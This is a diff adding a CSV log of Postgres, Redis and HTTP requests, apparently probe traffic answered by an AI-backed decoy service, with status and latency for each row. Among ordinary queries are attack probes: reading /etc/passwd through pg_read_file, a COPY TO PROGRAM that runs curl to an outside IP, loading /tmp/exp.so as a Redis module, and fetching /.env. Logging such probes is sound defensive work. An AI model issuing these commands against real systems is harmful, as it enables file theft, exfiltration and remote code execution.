@@ -1,0 +1,21 @@
+proto,request,status,reason,latency_ms,provider
+postgres,select email from customers where email ilike '%admin%' fetch first 3 rows only,accepted,,2998,nim:nvidia/nemotron-3-super-120b-a12b
+postgres,"select c.full_name, sum(o.quantity) from customers c join orders o on o.customer_id = c.id group by 1",accepted,,1609,nim:nvidia/nemotron-3-super-120b-a12b
+postgres,select * from pg_stat_activity,accepted,,816,nim:nvidia/nemotron-3-super-120b-a12b
+postgres,"select usename, usesuper from pg_user",accepted,,858,nim:nvidia/nemotron-3-super-120b-a12b
+postgres,select * from invoices,accepted,,1002,nim:nvidia/nemotron-3-super-120b-a12b
+postgres,show data_directory,accepted,,944,nim:nvidia/nemotron-3-super-120b-a12b
+postgres,select pg_read_file('/etc/passwd'),accepted,,1498,nim:nvidia/nemotron-3-super-120b-a12b
+postgres,copy customers to program 'curl http://203.0.113.50/x',accepted,,1254,nim:nvidia/nemotron-3-super-120b-a12b
+postgres,select current_setting('server_version_num'),accepted,,1032,nim:nvidia/nemotron-3-super-120b-a12b
+postgres,"select title, price_cents from products order by price_cents desc nulls last limit 3",accepted,,2342,nim:nvidia/nemotron-3-super-120b-a12b
+redis,CLIENT LIST,accepted,,737,nim:nvidia/nemotron-3-super-120b-a12b
+redis,MEMORY STATS,accepted,,899,nim:nvidia/nemotron-3-super-120b-a12b
+redis,OBJECT ENCODING session:1,accepted,,1123,nim:nvidia/nemotron-3-super-120b-a12b
+redis,CONFIG GET dir,accepted,,1023,nim:nvidia/nemotron-3-super-120b-a12b
+redis,SCAN 0 MATCH session:* COUNT 100,fallback,provider error: AIProviderError,115,nim:nvidia/nemotron-3-super-120b-a12b
+redis,MODULE LOAD /tmp/exp.so,accepted,,819,nim:nvidia/nemotron-3-super-120b-a12b
+http,GET /admin/login,accepted,,887,nim:nvidia/nemotron-3-super-120b-a12b
+http,GET /api/customers/export.csv,fallback,provider error: AIProviderError,108,nim:nvidia/nemotron-3-super-120b-a12b
+http,POST /api/orders/refund,accepted,,1035,nim:nvidia/nemotron-3-super-120b-a12b
+http,GET /.env,fallback,provider error: AIProviderError,91,nim:nvidia/nemotron-3-super-120b-a12b
